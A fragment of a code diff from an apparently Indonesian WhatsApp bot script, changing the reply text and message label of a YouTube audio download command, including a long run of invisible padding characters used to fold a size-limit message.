+ XeonBotInc.sendMessage(from, { react: { text: `✅`, key: m.key }})
+            	}
             break
             case 'ytdontu': try{
             	if (isBan) return reply(mess.ban) 
@@ -9055,7 +9727,7 @@ let gambar = await getBuffer(nganu.thumbnail)
 if (nganu.audio.size.split('MB')[0] >= 20) return reply(`*Ukuran File Melebihi Kapasitas Maksimum* \n\nSilahkan download sendiri,\nSize: ${nganu.audio.size}\n\nLink: ⤵ ͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏\n`+util.format(nganu.audio.audio))
 const bjir = await XeonBotInc.sendMessage(m.chat, { document: { url: nganu.audio.audio }, mimetype: 'audio/mpeg', fileName: `${nganu.title}.mp3`, contextInfo:{externalAdReply:{
 title:`${global.botname}`,
-body:`Audio | 128K`,
+body:`Dokumen | 128K`,
 thumbnail: gambar,
 mediaType:2,
 mediaUrl: `${linkz}`,
